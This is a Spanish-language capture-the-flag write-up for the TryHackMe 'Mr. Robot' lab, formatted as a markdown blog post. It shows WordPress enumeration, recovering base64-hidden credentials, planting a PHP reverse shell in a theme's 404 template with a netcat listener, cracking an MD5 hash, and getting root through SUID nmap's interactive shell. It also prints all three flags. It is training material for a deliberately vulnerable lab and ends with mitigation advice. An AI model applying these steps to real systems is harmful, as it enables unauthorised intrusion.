@@ -1,0 +1,574 @@
+---
+title: "Hackeando el CTF de Mr. Robot: Una Guía Práctica de Extremo a Extremo"
+description: "Una guía técnica completa para resolver la sala de dificultad media Mr. Robot en TryHackMe, que abarca enumeración web, reverse shells y escalada de privilegios mediante SUID."
+publishedAt: 2021-05-23
+author: "Luka Piplica"
+tags: ["linux", "cybersecurity", "tryhackme", "ctf", "walkthrough"]
+featured: false
+locale: es
+image: "../../../assets/blog/mr-robot-ctf/featured.webp"
+imageAlt: "Póster de la serie de televisión Mr. Robot que muestra un plano cercano de Elliot Alderson con un filtro rojo oscuro y el texto 'GOODBYE, FRIEND. MR. ROBOT'"
+---
+
+El CTF de Mr. Robot en TryHackMe es una máquina virtual clásica de dificultad media inspirada en la exitosa serie de televisión. Esta guía práctica (walkthrough) cubre todo el proceso de explotación de extremo a extremo, desde el reconocimiento inicial de la red y el brute-forcing de directorios web, hasta la estabilización de una reverse shell y el aprovechamiento de binarios SUID mal configurados para la escalada de privilegios a root.
+
+---
+
+## Entorno y Herramientas
+
+Para iniciar el proceso de explotación, establezca una conexión segura a la red de TryHackMe a través de OpenVPN. Este entorno utiliza herramientas estándar nativas de la distribución Kali Linux:
+
+* **Nmap:** Exploración de red y descubrimiento de servicios.
+* **Gobuster:** Brute-forcing de archivos y directorios.
+* **Netcat:** Inyección de datos arbitrarios y escucha de reverse shells.
+* **Python:** Estabilización de la shell TTY.
+
+---
+
+## Fase 1: Acceso Inicial y Reconocimiento de Red
+
+Antes de ejecutar cualquier escaneo activo contra el objetivo, se debe establecer un túnel seguro hacia la infraestructura de TryHackMe, seguido de un escaneo de puertos agresivo para mapear la superficie de ataque.
+
+### Estableciendo la Conexión OpenVPN
+
+1. Descargue su perfil de configuración personalizado (`.ovpn`) desde la <a href="https://tryhackme.com/access" target="_blank" rel="noopener noreferrer">página de acceso oficial de TryHackMe</a>.
+2. Inicialice la conexión utilizando la utilidad de línea de comandos de OpenVPN con privilegios de root:
+
+    ```shell
+    sudo openvpn <YOUR_FILENAME>.ovpn
+    ```
+
+3. Verifique que la interfaz del túnel (`tun0`) esté activa y tenga asignada una dirección IP dentro de la subred del laboratorio.
+
+### Enumeración de Red
+
+En primer lugar, necesitamos analizar qué puertos están abiertos. Cuanto más sepamos sobre el sistema, mejor. En este caso, utilizamos Nmap para escanear la red.
+
+#### Escaneo con Nmap
+
+Ejecutamos un escaneo de servicios agresivo (`-A`) contra la máquina objetivo para identificar puertos abiertos, detalles del sistema operativo y versiones de los servicios en ejecución:
+
+```shell
+nmap -A <TARGET_IP>
+```
+
+### Resultado del escaneo con Nmap
+
+```shell
+kali@kali:-/Desktop$ nmap 10.10.51.194 -A
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-23 18:35 CEST
+Nmap scan report for 10.10.38.44
+Host is up (0.095s latency).
+Not shown: 997 filtered ports
+PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open   ssl/http Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03    
+
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.90 seconds
+```
+
+Como podemos ver, tenemos el puerto 80 abierto, lo que nos indica que hay un sitio web en el protocolo HTTP. Nuestro siguiente paso es descubrir directorios y archivos ocultos en el servidor web mediante el brute-forcing de directorios.
+
+---
+
+## Fase 2: Descubrimiento de Directorios Web
+
+Para realizar la enumeración de directorios, necesitamos una lista de palabras (wordlist) de alta calidad y una herramienta de brute-forcing rápida. Utilizaremos **SecLists** para las listas de palabras y **Gobuster** para la fase de enumeración.
+
+### Instalación de SecLists
+
+Si no lo tiene instalado en su sistema, puede instalar la colección completa de SecLists utilizando `apt`:
+
+```shell
+sudo apt install seclists
+```
+
+Después de ejecutar este comando, las listas de palabras estarán disponibles en el directorio `/usr/share/seclists/`.
+
+### Enumeración de Directorios Utilizando Gobuster
+
+Utilizaremos el modo de directorio (`dir`) de Gobuster, apuntándolo a la URL del objetivo y empleando la lista de palabras `common.txt` de SecLists para descubrir endpoints activos en el servidor web:
+
+```shell
+gobuster dir -u http://<TARGET_IP>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+```
+
+#### Resultado del escaneo con Gobuster
+
+```shell
+kali@kali:~/Desktop$ gobuster dir -u http://10.10.51.194/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.51.194/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/05/23 18:27:45 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 213]
+/.htaccess            (Status: 403) [Size: 218]
+/.htpasswd            (Status: 403) [Size: 218]
+/0                    (Status: 301) [Size: 0] [--> http://10.10.51.194/0/]
+/Image                (Status: 301) [Size: 0] [--> http://10.10.51.194/Image/]
+/admin                (Status: 301) [Size: 234] [--> http://10.10.51.194/admin/]
+/atom                 (Status: 301) [Size: 0] [--> http://10.10.51.194/feed/atom/]
+/audio                (Status: 301) [Size: 234] [--> http://10.10.51.194/audio/]  
+/blog                 (Status: 301) [Size: 233] [--> http://10.10.51.194/blog/]   
+/css                  (Status: 301) [Size: 232] [--> http://10.10.51.194/css/]    
+/dashboard            (Status: 302) [Size: 0] [--> http://10.10.51.194/wp-admin/] 
+/favicon.ico          (Status: 200) [Size: 0]                                     
+/feed                 (Status: 301) [Size: 0] [--> http://10.10.51.194/feed/]     
+/images               (Status: 301) [Size: 235] [--> http://10.10.51.194/images/] 
+/image                (Status: 301) [Size: 0] [--> http://10.10.51.194/image/]    
+/index.php            (Status: 301) [Size: 0] [--> http://10.10.51.194/]          
+/index.html           (Status: 200) [Size: 1188]                                  
+/js                   (Status: 301) [Size: 231] [--> http://10.10.51.194/js/]     
+/intro                (Status: 200) [Size: 516314]                                
+/license              (Status: 200) [Size: 309]                                   
+/login                (Status: 302) [Size: 0] [--> http://10.10.51.194/wp-login.php]
+/page1                (Status: 301) [Size: 0] [--> http://10.10.51.194/]            
+/phpmyadmin           (Status: 403) [Size: 94]                                               
+/readme               (Status: 200) [Size: 64]                                               
+/rdf                  (Status: 301) [Size: 0] [--> http://10.10.51.194/feed/rdf/]            
+/robots               (Status: 200) [Size: 41]                                               
+/robots.txt           (Status: 200) [Size: 41]                                               
+/rss                  (Status: 301) [Size: 0] [--> http://10.10.51.194/feed/]                
+/rss2                 (Status: 301) [Size: 0] [--> http://10.10.51.194/feed/]                
+/sitemap              (Status: 200) [Size: 0]                                                
+/sitemap.xml          (Status: 200) [Size: 0]                                                
+/video                (Status: 301) [Size: 234] [--> http://10.10.51.194/video/]             
+/wp-admin             (Status: 301) [Size: 237] [--> http://10.10.51.194/wp-admin/]          
+/wp-content           (Status: 301) [Size: 239] [--> http://10.10.51.194/wp-content/]
+/wp-config            (Status: 200) [Size: 0]                                        
+/wp-includes          (Status: 301) [Size: 240] [--> http://10.10.51.194/wp-includes/]
+/wp-cron              (Status: 200) [Size: 0]                                         
+/wp-links-opml        (Status: 200) [Size: 227]                                       
+/wp-load              (Status: 200) [Size: 0]                                         
+/wp-login             (Status: 200) [Size: 2606]                                      
+/wp-mail              (Status: 500) [Size: 3064]                                      
+/wp-settings          (Status: 500) [Size: 0]                                         
+/wp-signup            (Status: 302) [Size: 0] [--> http://10.10.51.194/wp-login.php?action=register]
+/xmlrpc               (Status: 405) [Size:42]                                                      
+===============================================================
+2021/05/23 18:40:33 Finished
+===============================================================
+```
+
+---
+
+## Fase 3: Extrayendo la Clave #1
+
+Al revisar los resultados de nuestra enumeración de directorios, destacan varios endpoints de alto valor. La presencia de múltiples rutas `/wp-` confirma que el objetivo está ejecutando un CMS WordPress. Además, los archivos `/robots.txt` y `/robots` son accesibles de inmediato. 
+
+Cuando navegamos a la dirección IP base en un navegador web, se nos recibe con una página de inicio interactiva personalizada e inspirada en la serie:
+
+![Página de inicio del objetivo](../../../assets/blog/mr-robot-ctf/1.webp)
+
+Para encontrar nuestro punto de entrada inicial, inspeccionamos el archivo `/robots.txt` navegando a `http://<TARGET_IP>/robots.txt`. El servidor web expone dos archivos específicos dentro de este directorio:
+
+![Inspeccionando robots.txt](../../../assets/blog/mr-robot-ctf/2.webp)
+
+El resultado revela dos recursos:
+* `fsociety.dic` — Un archivo de lista de palabras personalizado que probablemente será útil para el brute-forcing de autenticación más adelante.
+* `key-1-of-3.txt` — La ubicación de nuestra primera flag.
+
+### Descargando la Primera Clave
+
+Aunque podemos ver el token directamente en el navegador, también podemos descargarlo o leerlo limpiamente a través de la terminal utilizando la utilidad `curl`:
+
+```shell
+curl -s http://<TARGET_IP>/key-1-of-3.txt
+```
+
+#### Resultado
+
+```shell
+kali@kali:~/Desktop$ curl -s http://10.10.51.194/key-1-of-3.txt
+
+073403c8a58a1f80d943455fb30724b9
+```
+**Clave #1 Asegurada:** 073403c8a58a1f80d943455fb30724b9
+
+---
+
+## Fase 4: Autenticación Web y Brute-Forcing
+
+Con la primera flag asegurada, cambiamos nuestro enfoque hacia la obtención del acceso inicial al sistema. El resultado de Gobuster resaltó múltiples endpoints de WordPress, apuntando específicamente a `/wp-login.php`.
+
+### Analizando el Formulario de Inicio de Sesión de WordPress
+
+Cuando navegamos a `http://<TARGET_IP>/wp-login.php`, se nos presenta un panel de autenticación estándar de WordPress:
+
+![Panel de inicio de sesión de WordPress](../../../assets/blog/mr-robot-ctf/3.webp)
+
+Para proceder, necesitamos credenciales válidas. Intentar inicios de sesión arbitrarios revela un comportamiento interesante en el manejo de errores de la aplicación. Si ingresamos un nombre de usuario no válido, el sistema muestra un mensaje de error explícito:
+
+> **Pista de la aplicación:** "Invalid username." (Nombre de usuario no válido).
+
+Esta configuración específica de errores nos permite realizar una enumeración de usuarios. Una vez que adivinemos un nombre de usuario válido, el mensaje de error cambiará para quejarse de una contraseña incorrecta, confirmando así que el usuario existe.
+
+### Preparando la Lista de Palabras (`fsociety.dic`)
+
+Antes de ejecutar un ataque de fuerza bruta, debemos obtener el archivo de diccionario personalizado descubierto anteriormente en `/robots.txt`. Lo descargamos utilizando `curl`:
+
+```shell
+curl -o fsociety.dic http://<TARGET_IP>/fsociety.dic
+```
+
+Después de descargar la lista de palabras, podemos inspeccionar su tamaño y estructura. Un análisis rápido revela que `fsociety.dic` es una lista masiva de más de 850,000 palabras. Sin embargo, contiene miles de entradas duplicadas, lo que ralentizaría innecesariamente nuestros intentos de fuerza bruta. Podemos optimizarla ordenando el archivo y extrayendo únicamente las entradas que sean únicas:
+
+```shell
+sort -u fsociety.dic > fsociety_unique.dic
+```
+
+Esto reduce el tamaño del diccionario de más de 850,000 palabras a aproximadamente 11,000 términos únicos, lo que hace que nuestra fase de fuerza bruta sea significativamente más rápida.
+
+### Realizando la Enumeración de Usuarios y Contraseñas
+
+Utilizando la lista de palabras optimizada, podemos apuntar al formulario de inicio de sesión de WordPress con herramientas como **WPScan** o **Hydra** para descubrir usuarios y contraseñas válidos. Primero, enumeramos los usuarios válidos:
+
+```shell
+wpscan --url http://<TARGET_IP>/ -U fsociety_unique.dic --enumerate u
+```
+
+Este escaneo identifica rápidamente el nombre de usuario `elliot`. 
+
+Sin embargo, en lugar de gastar tiempo de cómputo realizando un ataque de fuerza bruta a la contraseña de la cuenta `elliot` con nuestra lista de palabras, una inspección más profunda de nuestro escaneo de directorios previo con Gobuster revela un camino mucho más rápido.
+
+### Descubriendo las Credenciales Ocultas
+
+El resultado del escaneo de directorios de Gobuster incluyó un endpoint `/license` que devolvía un código de estado `200 OK`. Cuando solicitamos este endpoint utilizando `curl`, recibimos un aviso de licencia críptico. De manera crucial, al desplazarse hacia abajo o limpiar los espacios en blanco se revela una cadena en Base64 oculta al final del documento:
+
+```shell
+curl -s http://<TARGET_IP>/license | tr -d "\n"
+```
+
+#### Resultado
+
+```shell
+what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?do you want a    password or something? ZWxsaW90OkVSMjgtMDY1Mgo=
+```
+
+La cadena específica `ZWxsaW90OkVSMjgtMDY1Mgo=` al final se ve sospechosamente como unas credenciales codificadas en Base64.
+
+### Decodificando la Cadena Base64
+
+Podemos decodificar esta cadena directamente en nuestra terminal:
+
+```shell
+echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
+```
+
+#### Resultado
+
+```shell
+elliot:ER28-0652
+```
+
+¡Éxito! El resultado decodificado proporciona credenciales válidas en el formato `usuario:contraseña`:
+* **Usuario:** `elliot`
+* **Contraseña:** `ER28-0652`
+
+> **Dato curioso:** La contraseña `ER28-0652` es una ingeniosa referencia al número de identificación laboral de Elliot Alderson en Allsafe Cybersecurity en la serie de televisión *Mr. Robot*.
+
+---
+
+## Fase 5: Obtención del Acceso Inicial (Reverse Shell)
+
+Ahora que tenemos credenciales administrativas, podemos autenticarnos en el backend de WordPress e intentar obtener ejecución remota de comandos (RCE) en el servidor subyacente.
+
+### Autenticándose en el Panel de Administración de WordPress
+
+1. Navegue a `http://<TARGET_IP>/wp-login.php` (o `/login`).
+2. Inicie sesión utilizando las credenciales que recuperamos: `elliot` / `ER28-0652`.
+3. Tras autenticarse correctamente, seremos redirigidos al Panel de Administración principal de WordPress. En la esquina inferior derecha del panel, se muestra que la versión es la **4.3.1**, la cual está muy desactualizada y es conocida por ser vulnerable a vectores de explotación mediante la edición de temas.
+
+![Panel de administración de WordPress](../../../assets/blog/mr-robot-ctf/4.webp)
+
+### Explotando el Editor de Temas para la Ejecución Remota de Comandos
+
+Debido a que tenemos permisos de nivel de administrador, podemos aprovechar el editor de temas integrado para inyectar un script PHP personalizado y ejecutar comandos del sistema.
+
+1. Navegue a **Appearance > Theme Editor** (Apariencia > Editor de temas) en el panel de navegación de la izquierda.
+
+![Navegación al Editor de Temas](../../../assets/blog/mr-robot-ctf/5.webp)
+
+2. Dentro de las plantillas del tema activo (usualmente *Twenty Fifteen*), localice la plantilla **404 Template** (`404.php`).
+
+![Localizando la plantilla 404.php](../../../assets/blog/mr-robot-ctf/6.webp)
+
+3. Reemplazaremos la plantilla `404.php` por defecto con un script de reverse shell en PHP personalizado. Podemos utilizar el ampliamente confiable <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank" rel="noopener noreferrer">PentestMonkey PHP Reverse Shell</a>.
+4. Descargue el script y actualice las variables de configuración (`$ip` y `$port`) para que apunten a la dirección IP local de su máquina Kali Linux (la asignada a su interfaz `tun0`) y a un puerto de su elección (por ejemplo, `1234`):
+
+    ```php
+    $ip = '10.10.x.x';  // Reemplace con la IP local de su interfaz tun0 en Kali
+    $port = 1234;       // Su puerto de escucha local
+    ```
+
+5. Copie el código actualizado y péguelo por completo en el editor de WordPress, sobrescribiendo el contenido original de `404.php`. Haga clic en **Update File** (Actualizar archivo) para guardar los cambios.
+
+> **Importante:** Asegúrese de obtener su IP local precisa de la interfaz `tun0` utilizando el comando `ip a` o `ifconfig` en Kali antes de configurar el payload.
+
+### Configuración de un Oyente (Listener) con Netcat
+
+Antes de activar nuestro payload, debemos configurar un oyente de puerto local en nuestra máquina Kali para recibir la conexión entrante:
+
+```shell
+nc -nlvp 1234
+```
+
+### Activando la Reverse Shell
+
+Para ejecutar nuestro código PHP inyectado, provocamos una página 404 navegando a una página inexistente o llamando directamente a la URL de la plantilla modificada:
+
+```shell
+curl -s http://<TARGET_IP>/wp-content/themes/twentyfifteen/404.php
+```
+
+Alternativamente, simplemente visitando `http://<TARGET_IP>/noexiste` en el navegador se activará la plantilla. Al regresar a nuestra terminal, vemos que el oyente de Netcat recibe con éxito la conexión, proporcionándonos una shell:
+
+![Reverse shell recibida en Netcat](../../../assets/blog/mr-robot-ctf/7.webp)
+
+---
+
+## Fase 6: Enumeración Local y Escalada de Usuarios
+
+Nuestra reverse shell nos otorga una conexión, pero está muy limitada. Al verificar nuestros privilegios actuales, vemos que estamos ejecutando comandos bajo una cuenta de servicio de bajos privilegios:
+
+```shell
+$ whoami
+daemon
+```
+
+### Estabilización de la Shell (Spawning de TTY)
+
+Las reverse shells estándar obtenidas a través de Netcat son shells "simples" o básicas que carecen de funciones esenciales como el historial de comandos, el autocompletado con el tabulador o el control de trabajos, y la ejecución de comandos como `su` o `sudo` fallará. Verificamos si Python está instalado en el host para generar (spawn) una shell TTY completamente interactiva:
+
+```shell
+$ which python
+/usr/bin/python
+```
+
+Dado que Python está disponible, generamos una sesión interactiva de bash utilizando el módulo `pty`:
+
+```shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Esto eleva nuestra sesión a una shell TTY completamente interactiva, permitiéndonos ejecutar comandos del sistema más complejos.
+
+### Investigando el Directorio Home
+
+Listamos el contenido del directorio `/home` para encontrar usuarios válidos en el sistema:
+
+```shell
+ls -la /home
+# El resultado muestra un usuario llamado `robot`.
+```
+
+Al inspeccionar el directorio `/home/robot` se revelan dos archivos críticos:
+
+```shell
+$ ls -l /home/robot
+total 8
+-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
+```
+
+Vemos que `key-2-of-3.txt` contiene nuestra segunda bandera, pero tiene permisos estrictos de solo lectura (`-r--------`) y pertenece exclusivamente al usuario `robot`. Sin embargo, el segundo archivo `password.raw-md5` tiene permisos de lectura global (world-readable):
+
+```shell
+$ cat /home/robot/password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+```
+
+Esto nos da el hash de la contraseña en MD5 para el usuario `robot`.
+
+### Craqueando el Hash de la Contraseña MD5
+
+El hash `c3fcd3d76192e4007dfb496cca67e13b` es una representación MD5 sin sal (unsalted) de la contraseña. Debido a que MD5 es criptográficamente débil, podemos revertir o craquear este hash fácilmente. Podemos utilizar una base de datos de búsqueda MD5 en línea (como Gromweb o CrackStation) o craquearlo localmente usando **Hashcat** o **John the Ripper**:
+
+```shell
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+El hash se decodifica en el siguiente valor en texto plano:
+`abcdefghijklmnopqrstuvwxyz`
+
+* **Usuario:** `robot`
+* **Contraseña:** `abcdefghijklmnopqrstuvwxyz`
+
+### Cambiando al Usuario Robot
+
+Ahora, podemos escalar nuestros privilegios localmente desde el usuario de bajos privilegios `daemon` hacia el usuario `robot`, autenticándonos con las credenciales que acabamos de craquear:
+
+```shell
+$ su - robot
+Password: abcdefghijklmnopqrstuvwxyz
+robot@mercury:~$ whoami
+robot
+```
+
+### Recuperando la Clave #2
+
+Con nuestros nuevos privilegios de usuario, ahora podemos leer la segunda bandera:
+
+```shell
+robot@mercury:~$ cat /home/robot/key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+```
+
+**Clave #2 Asegurada:** `822c73956184f694993bede3eb39f959`
+
+---
+
+## Fase 7: Escalada de Privilegios a Root
+
+Con dos de las tres claves aseguradas, nuestro objetivo final es escalar nuestros privilegios a `root` y recuperar la tercera clave, que generalmente se encuentra almacenada en el directorio `/root`.
+
+### Verificando Privilegios de Sudo
+
+Primero, verificamos si el usuario `robot` tiene algún permiso administrativo a través de sudo:
+
+```shell
+robot@mercury:~$ sudo -l
+[sudo] password for robot: abcdefghijklmnopqrstuvwxyz
+Sorry, user robot may not run sudo on linux.
+```
+
+El usuario no forma parte del grupo sudoers. Por lo tanto, debemos encontrar un vector alternativo para la escalada de privilegios.
+
+### Identificación de Binarios SUID
+
+Un vector común para la escalada de privilegios local en Linux es la explotación de binarios mal configurados que tienen activo el bit SUID (Set Owner User ID). Cuando se ejecuta un binario con el bit SUID, este se ejecuta con los privilegios del propietario del archivo (en este caso, `root`) en lugar de los del usuario que lo ejecuta.
+
+Buscamos en todo el sistema de archivos binarios SUID que pertenezcan a `root`:
+
+```shell
+find / -user root -perm -4000 -print 2>/dev/null
+```
+
+#### Resultado
+
+```shell
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+```
+
+El listado muestra una entrada muy inusual: `/usr/local/bin/nmap`. 
+
+### Explotación de Nmap SUID (Modo Interactivo)
+
+Verificamos los permisos y la versión del binario de Nmap:
+
+```shell
+$ ls -l /usr/local/bin/nmap
+-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
+```
+
+La `s` en el bloque de permisos del propietario (`-rwsr-xr-x`) confirma que el bit SUID está activo y que pertenece a `root`. A continuación, inspeccionamos la versión de Nmap:
+
+```shell
+$ /usr/local/bin/nmap --version
+nmap version 3.81 ( http://www.insecure.org/nmap/ )
+```
+
+Nmap está ejecutando la versión **3.81**. Las versiones antiguas de Nmap (específicamente las publicaciones entre las versiones `2.02` y `5.21`) contienen un **modo interactivo** diseñado para permitir a los usuarios ejecutar comandos y scripts en un entorno interactivo. Debido a que el binario se ejecuta con privilegios de nivel root debido a la configuración SUID, iniciar una shell desde la consola interactiva escala nuestra sesión directamente a `root`.
+
+1. Inicie Nmap en modo interactivo:
+    ```shell
+    /usr/local/bin/nmap --interactive
+    ```
+
+2. Dentro de la consola interactiva, generamos una shell de escape utilizando el prefijo de signo de exclamación `!`:
+    ```shell
+    nmap> !sh
+    ```
+
+3. Verifique nuestros nuevos privilegios:
+    ```shell
+    # whoami
+    root
+    ```
+
+Hemos evadido con éxito todas las restricciones del sistema y ahora estamos ejecutando con privilegios administrativos totales de root.
+
+### Recuperando la Clave #3
+
+Nos dirigimos al directorio `/root` y verificamos la existencia de la última bandera:
+
+```shell
+# ls -la /root
+total 28
+drwx------  3 root root 4096 Nov 13  2015 .
+drwxr-xr-x 22 root root 4096 Nov 13  2015 ..
+-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
+-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
+```
+
+Leemos el contenido del último archivo de texto:
+
+```shell
+# cat /root/key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+```
+
+**Clave #3 Asegurada:** `04787ddef27c3dee1ee161b21670b4e4`
+
+---
+
+## Conclusión y Recomendaciones de Seguridad
+
+La sala Mr. Robot de TryHackMe es una excelente demostración de una explotación de sistemas en múltiples etapas. Ilustra cómo vulnerabilidades y malas configuraciones simples y menores (como un string en base64 expuesto, un hash de contraseña débil, software desactualizado y permisos SUID) pueden encadenarse para lograr el control total de un servidor.
+
+### Pautas de Mitigación
+
+1. **Limpieza del Web Root y Permisos:** Los archivos sensibles (como diccionarios `.dic` o archivos de texto personalizados) nunca deben ser accesibles desde la raíz web pública. La configuración de `/robots.txt` no debe revelar credenciales ni recursos activos del sistema.
+2. **Dar de Baja Versiones Obsoletas de CMS:** Las versiones desactualizadas de software como WordPress 4.3.1 son extremadamente vulnerables. Actualice todas las aplicaciones web, complementos (plugins) y sistemas CMS principales a sus parches estables más recientes.
+3. **Auditar Configuraciones SUID:** Escanee regularmente los sistemas en busca de binarios SUID/SGID. No configure utilidades de ejecución potentes como Nmap, compiladores o editores de texto con permisos SUID. Si se requiere la ejecución como root para tareas específicas, controle estrictamente los permisos a través de reglas cuidadosamente diseñadas en `/etc/sudoers`.
+4. **Implementar Políticas de Contraseñas Robustas:** Evite las referencias en texto plano a credenciales o los esquemas estándar de hash MD5. Proteja todas las credenciales con algoritmos de hashing modernos, robustos y con sal (salted), como bcrypt o Argon2.
+
+---
+
+## Registro Retrospectivo de Banderas
+
+Aquí está la lista final de las claves recuperadas a lo largo del compromiso del sistema:
+
+| Pregunta / Ubicación de la Clave | Hash Recuperado |
+| :--- | :--- |
+| **Clave #1** (desde `/robots.txt` / raíz del servidor web) | `073403c8a58a1f80d943455fb30724b9` |
+| **Clave #2** (desde `/home/robot/key-2-of-3.txt`) | `822c73956184f694993bede3eb39f959` |
+| **Clave #3** (desde `/root/key-3-of-3.txt`) | `04787ddef27c3dee1ee161b21670b4e4` |
+
+*Esta guía está destinada exclusivamente a fines educativos y para demostrar la importancia de la configuración segura de sistemas, los controles de acceso robustos y la gestión proactiva de parches.*
